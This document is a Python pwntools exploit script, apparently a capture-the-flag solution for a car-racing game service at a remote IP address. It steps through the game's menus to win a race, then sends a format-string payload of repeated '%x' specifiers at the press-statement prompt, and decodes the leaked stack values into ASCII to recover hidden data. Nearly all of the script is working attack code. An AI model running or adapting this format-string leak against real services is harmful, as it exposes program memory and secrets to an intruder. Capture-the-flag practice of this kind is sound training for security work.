from pwn import *

context.log_level = 'critical'
context.update(arch='x86_64', os='linux')

conn = remote('94.237.120.112', 57894)

sla = lambda x, y: conn.sendlineafter(x, y)

# ─────────── Banner ───────────
banner = conn.recvuntil(b'Insert your data:\n')
print(banner.decode(errors='ignore')) 
# ─────────── User Info ───────────
sla(b'Name:', b'Yabba')
sla(b'Nickname:', b'Dabba')

# Leer hasta coins SIN comerse el menú
coins = conn.recvuntil(b'[*] Current coins:')
coins += conn.recvline()
print(coins.decode(errors='ignore'))

# ─────────── Menú principal ───────────
sla(b'>', b'2')   # Car selection

# ─────────── Selección de carro ───────────
car_choice = b'1'  # 🚗
sla(b'>', car_choice)

car_selected = "🚗"
print(f"[+] Car selected: {car_selected}")

# ─────────── Selección de carrera ───────────
race_choice = b'2'  # Circuit
sla(b'>', race_choice)

race_selected = "Circuit"
print(f"[+] Race selected: {race_selected}")

# ─────────── Resultado de la carrera ───────────
race_win = conn.recvuntil(
    b'[!] Do you have anything to say to the press after your big victory?\n'
)
print(race_win.decode(errors='ignore'))

# ─────────── Exploit ───────────

exp = b"%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x "
sla(b'>', exp)

# ─────────── Leer salida final completa ───────────
print(conn.recvuntil(
    b'The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:'
).decode())

final_output = b""

while True:
    try:
        chunk = conn.recv(timeout=1)
        if not chunk:
            break
        final_output += chunk
    except EOFError:
        break

print(final_output.decode(errors='ignore'))

values = final_output.split()

decoded = b""

for v in values:
    try: 
            decoded += p32(int(v, 16))
    except:
        continue

print("[+] Decoded bytes:")
print(decoded)

print("\n[+] ASCII:")
print(decoded.decode(errors="ignore"))
